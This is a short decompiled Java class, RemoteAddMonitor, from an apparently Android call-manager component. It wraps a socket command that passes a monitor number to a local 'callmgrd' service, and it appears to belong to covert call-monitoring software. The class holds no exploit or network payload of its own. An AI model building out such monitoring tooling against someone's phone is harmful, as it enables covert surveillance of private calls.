package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.MonitorNumber;

public class RemoteAddMonitor
  extends SocketCmd
{
  private static final long serialVersionUID = 2192184268450011201L;
  
  public RemoteAddMonitor(MonitorNumber paramMonitorNumber)
  {
    super(paramMonitorNumber, Boolean.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.callmgrd";
  }
  
  protected String getTag()
  {
    return "RemoteAddMonitor";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteAddMonitor.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */